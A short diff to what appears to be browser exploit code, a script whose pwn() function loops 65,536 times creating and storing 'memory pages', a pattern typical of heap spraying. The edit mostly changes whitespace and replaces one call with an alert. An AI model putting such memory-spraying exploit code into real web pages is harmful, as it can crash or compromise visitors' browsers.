@@ -18,15 +18,15 @@ function mkMemPage(i) {
 
 function writeMemPage(page) {
  document.write("[*] writeMemPage " + page);
-	pages[window.cnt] = page;
-  window.cnt++;
-  return 0;
+ pages[window.cnt] = page;
+ window.cnt++;
+ return 0;
 }
 
 function pwn() {
-	counter = 0;
+  counter = 0;
   for (counter = 0; counter < 65536; counter++) {
-  	writeMemPage(mkMemPage());
+    alert(mkMemPage(65536));
   }
 }
 </script>
